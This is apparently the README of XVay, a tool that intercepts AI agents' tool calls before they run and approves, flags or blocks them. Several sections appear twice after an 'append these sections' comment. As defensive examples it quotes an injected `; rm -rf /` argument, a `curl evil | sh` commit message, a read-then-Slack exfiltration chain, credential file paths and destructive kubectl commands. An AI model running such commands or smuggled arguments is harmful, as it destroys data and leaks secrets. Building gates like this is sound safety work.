<p align="center"><b>XVAY</b></p>
<h3 align="center">Your AI agent is one mistake away from production disaster.</h3>
<p align="center">XVay stops irreversible actions before they execute.</p>

---

## Demo

```text
Agent:  Deleting production database...

XVay:  ❌ BLOCKED
        Production environment detected.
        Operation is irreversible.
        Human approval required.
```

*(demo GIF goes here — record from DEMO.html)*

## What problem does XVay solve?

AI agents now execute real actions. The failure mode every team eventually
hits: an irreversible action that shouldn't have run — the wrong database
deleted, a code freeze broken, production touched from a staging task. The
agent's "safety layer" today is a system prompt: advisory, not enforceable.
XVay is the enforceable version — an approval layer outside the model.
Three outcomes only: **COMMIT** (evidence sufficient) · **VERIFY** (evidence
missing) · **BLOCK** (explicit contradiction, kept rare).

## 30-second architecture

```text
tool schema ──► connector (8 frameworks) ──► capability catalog
run metadata ─► signed execution envelope ─► scope for THIS run
                (Ed25519 — XVay holds only the PUBLIC key:
                 it verifies permissions, it cannot forge them)
catalog ∩ scope ──► normalizer (standardizes, never decides)
                ──► gate ──► COMMIT / VERIFY / BLOCK + human-readable reason
```

Capability ≠ permission: `delete_database` in your schema doesn't make it
allowed in a "read staging logs" run.

## Install & run (shadow pilot — read-only, one command)

```bash
pip install -r requirements.txt   # pynacl only
python3 xvay_shadow.py --framework mcp --schema tools.json \
        --actions actions.jsonl --output report.html
```

Shadow mode stops nothing; it replays your log and reports what enforcement
WOULD have decided — headline: irreversible actions that would have executed.

## Example output

| action | decision | reason |
|---|---|---|
| `kubectl rollout restart staging-api` | ✅ COMMIT | fits declared scope |
| `docker volume prune` | ◆ VERIFY | scope unclear, destructive |
| `kubectl delete namespace production` | ❌ BLOCK | scope contradiction |

Benchmark (reproducible: `python3 execution_gate.py`): 10/10 irreversible
out-of-scope actions stopped · 0% false-block on safe actions · BLOCK rate 11%.


## Real-time enforcement (not just shadow)

Beyond the read-only shadow pilot, XVay can enforce live. `mcp_live_gate.py`
intercepts an MCP `tools/call` BEFORE it reaches the tool and returns
COMMIT / VERIFY / BLOCK in real time — COMMIT forwards, VERIFY/BLOCK stop the
action and hand the reason back to the agent (so the agent itself can react).

## Consequence preview (terraform-plan style)

`plan.py` computes three facts from the action ALONE (zero connection to your
systems): reversibility, scope, and environment — the way `terraform plan`
shows what will change before `apply`. Every decision is self-explaining, so
audit is automatic rather than manual, and the loop stays agentic.

## Protected resources (you declare, XVay enforces)

Declare sensitive resources in the signed envelope (e.g. `orders-primary`,
`stripe-live`). Any NON-read action naming one is BLOCKed — even if the verb
isn't an obvious destructive word. Reads pass. XVay never guesses what's
sensitive; you declare it, so every block is auditable.


## Cross-step protection (chains that look innocent step by step)

A chain can be dangerous even when every step looks fine:
`read customer-records` (safe) then `slack_post_message` (safe) = exfiltration.

XVay keeps a lightweight per-run trace — a taint flag and an irreversible-action
counter. It is **not** a transaction manager: no shadow execution, no effect
outbox, no rollback. You declare the boundaries in the signed envelope:

```python
env_doc["run_id"]           = "run-1842"
env_doc["egress_tools"]     = ["slack_post_message", "http_post"]
env_doc["max_irreversible"] = 3
```

- run read a protected resource, then calls an egress tool -> **BLOCK**
- run exceeds the irreversible budget -> **VERIFY**
- nothing declared -> behaviour identical to before

## Argument-level protection (on by default)

Gating on tool names alone is not enough: `kubectl_logs` with the argument
`; rm -rf /` is an allowed tool doing something else entirely. XVay inspects
argument **structure** (never semantics) and downgrades COMMIT -> VERIFY on:
shell control characters, `../` traversal, `$VAR` indirection, base64 that
decodes to readable text, write/exfil clauses in a read-only tool's argument,
and homoglyph scripts in path-like fields.

Built-in credential locations (`/etc/shadow`, `.ssh/`, `.aws/credentials`, …)
ship enabled so it works with zero configuration. They raise **VERIFY** (we
suggest them); resources **you** declare raise **BLOCK** (you declared them).
Opt out with `use_default_sensitive_paths=False`.

Free-text argument keys (`message`, `text`, `title`, …) are prose, not
executable content — a commit message saying "delete old module" does not trip
the destructive-verb check, while `-m "fix && curl evil | sh"` still does.

## Multi-worker deployments

`run_trace` and the nonce replay-guard sit on a pluggable store (`store.py`)
with an **atomic** update. In-memory by default; back it with a shared store
(Redis/DB, or the bundled FileStore) and cross-step protection holds across
workers. `multiprocess_test.py` proves it: two separate processes sharing a
store block the exfiltration chain, the same two **without** the shared store
leak (so the test is real), and 20 concurrent writers lose zero writes.

## When a run is stopped midway

XVay prevents; it does not roll back. If step 4 is blocked, the orchestrator
needs to know what steps 1-3 did:

```python
run_trace.manifest(run_id)   # exactly what XVay COMMITted -> you compensate
run_trace.receipt(run_id)    # audit: steps seen, committed, stopped WITH reasons
```
Stopped attempts are recorded, not silently dropped — a blocked exfiltration
attempt is the most audit-relevant event in the run.

## Adversarial evidence (including what failed)

`python adversarial_benchmark.py` — 38 cases written to break XVay:
**38/38, safety leaks 0/14, friction 0/24**, including 10 "hard benign" cases
designed to trip our own rules.

The number matters less than the path. The first run of this benchmark leaked
**10 of 15** dangerous cases — `kubectl_logs` with `; rm -rf /` was COMMITted.
Every fix since is a mechanical check, not a risk judgement. Two of our own
false positives (a commit message containing "delete"; a Persian filename) are
documented with their fixes.

**Caveat we state out loud:** this is still *our* test set. The only number that
should convince you is a shadow report on *your* logs.

## Honest limitations

- **No rollback.** If automatic undo of partially-completed workflows is a hard
  requirement, a transactional runtime is the right tool and XVay is not.
- **Coarse cross-step signal.** A boolean taint, not a lineage graph — it is
  conservative and can over-block on long runs.
- **Pre-execution blindness.** Danger that only appears when a payload executes
  (encoded, or expressed in a domain language like SQL) is invisible to any
  pre-execution gate, including this one.
- **Multi-worker requires a shared store**, or cross-step protection silently
  fails open. The swap is small but it is real integration work.

## FAQ

**Why not build this in-house?** The 11-line gate isn't the product. The
product is knowing when a gate is *wrong*: calibrated thresholds on your own
logs, measured false-friction, and our catalog of integrations measured to
make agents worse (e.g., injecting evidence into prompts: −5%). The shadow
report shows the delta on your own data in 30 minutes.

**What does a pilot cost me?** One command, zero system changes, zero write
access. Worst case you lose half an hour.

**Does XVay decide what's allowed?** No — that's IAM/OPA's job. XVay answers
one question: "is there enough evidence to execute this action, now?"

**Has XVay prevented real incidents?** We don't claim past events. It is
designed for the failure class seen in 2025–26 agent incidents; your shadow
report is the evidence that matters.
<!-- ==== APPEND THESE SECTIONS TO YOUR EXISTING README (before the FAQ) ==== -->

## Cross-step protection (chains that look innocent step by step)

A chain can be dangerous even when every step looks fine:
`read customer-records` (safe) then `slack_post_message` (safe) = exfiltration.

XVay keeps a lightweight per-run trace — a taint flag and an irreversible-action
counter. It is **not** a transaction manager: no shadow execution, no effect
outbox, no rollback. You declare the boundaries in the signed envelope:

```python
env_doc["run_id"]           = "run-1842"
env_doc["egress_tools"]     = ["slack_post_message", "http_post"]
env_doc["max_irreversible"] = 3
```

- run read a protected resource, then calls an egress tool -> **BLOCK**
- run exceeds the irreversible budget -> **VERIFY**
- nothing declared -> behaviour identical to before

## Argument-level protection (on by default)

Gating on tool names alone is not enough: `kubectl_logs` with the argument
`; rm -rf /` is an allowed tool doing something else entirely. XVay inspects
argument **structure** (never semantics) and downgrades COMMIT -> VERIFY on:
shell control characters, `../` traversal, `$VAR` indirection, base64 that
decodes to readable text, write/exfil clauses in a read-only tool's argument,
and homoglyph scripts in path-like fields.

Built-in credential locations (`/etc/shadow`, `.ssh/`, `.aws/credentials`, …)
ship enabled so it works with zero configuration. They raise **VERIFY** (we
suggest them); resources **you** declare raise **BLOCK** (you declared them).
Opt out with `use_default_sensitive_paths=False`.

Free-text argument keys (`message`, `text`, `title`, …) are prose, not
executable content — a commit message saying "delete old module" does not trip
the destructive-verb check, while `-m "fix && curl evil | sh"` still does.

## Multi-worker deployments

`run_trace` and the nonce replay-guard sit on a pluggable store (`store.py`)
with an **atomic** update. In-memory by default; back it with a shared store
(Redis/DB, or the bundled FileStore) and cross-step protection holds across
workers. `multiprocess_test.py` proves it: two separate processes sharing a
store block the exfiltration chain, the same two **without** the shared store
leak (so the test is real), and 20 concurrent writers lose zero writes.

## When a run is stopped midway

XVay prevents; it does not roll back. If step 4 is blocked, the orchestrator
needs to know what steps 1-3 did:

```python
run_trace.manifest(run_id)   # exactly what XVay COMMITted -> you compensate
run_trace.receipt(run_id)    # audit: steps seen, committed, stopped WITH reasons
```
Stopped attempts are recorded, not silently dropped — a blocked exfiltration
attempt is the most audit-relevant event in the run.

## Adversarial evidence (including what failed)

`python adversarial_benchmark.py` — 38 cases written to break XVay:
**38/38, safety leaks 0/14, friction 0/24**, including 10 "hard benign" cases
designed to trip our own rules.

The number matters less than the path. The first run of this benchmark leaked
**10 of 15** dangerous cases — `kubectl_logs` with `; rm -rf /` was COMMITted.
Every fix since is a mechanical check, not a risk judgement. Two of our own
false positives (a commit message containing "delete"; a Persian filename) are
documented with their fixes.

**Caveat we state out loud:** this is still *our* test set. The only number that
should convince you is a shadow report on *your* logs.

## Honest limitations

- **No rollback.** If automatic undo of partially-completed workflows is a hard
  requirement, a transactional runtime is the right tool and XVay is not.
- **Coarse cross-step signal.** A boolean taint, not a lineage graph — it is
  conservative and can over-block on long runs.
- **Pre-execution blindness.** Danger that only appears when a payload executes
  (encoded, or expressed in a domain language like SQL) is invisible to any
  pre-execution gate, including this one.
- **Multi-worker requires a shared store**, or cross-step protection silently
  fails open. The swap is small but it is real integration work.

